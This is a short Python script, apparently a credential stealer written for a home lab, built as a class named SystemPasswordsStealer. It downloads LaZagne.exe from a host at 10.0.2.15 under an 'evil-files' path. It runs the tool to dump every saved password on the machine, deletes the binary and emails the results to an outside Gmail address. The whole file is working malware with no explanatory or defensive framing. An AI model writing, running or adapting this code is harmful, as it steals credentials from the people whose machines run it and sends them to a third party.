import send_mails
import subprocess
import requests
import tempfile
import os
import sys


class SystemPasswordsStealer:
    def __init__(self):
        self.mailer = send_mails.SendMails()
        self.passwords = ""
        self.temp_directory = tempfile.gettempdir()

    def upload(self, url):
        get_response = requests.get(url=url)
        filename = url.split("/")[-1]
        with open(filename, "wb") as file:
            file.write(get_response.content)

    def get_passwords(self):
        try:
            os.chdir(self.temp_directory)
            self.upload("http://10.0.2.15/evil-files/LaZagne.exe")
            self.passwords = subprocess.check_output('"LaZagne.exe" all', shell=True).decode()
            os.remove("LaZagne.exe")
        except subprocess.CalledProcessError as e:
            self.passwords = f"Error during execution: {e}"

    def report(self, mail_body):
        self.mailer.send_mail("hack3d.txt@gmail.com", "Saved Passwords on Target System", mail_body)

    def start(self):
        self.get_passwords()
        self.report(self.passwords)
        sys.exit()


systempasswordsstealer = SystemPasswordsStealer()
systempasswordsstealer.start()
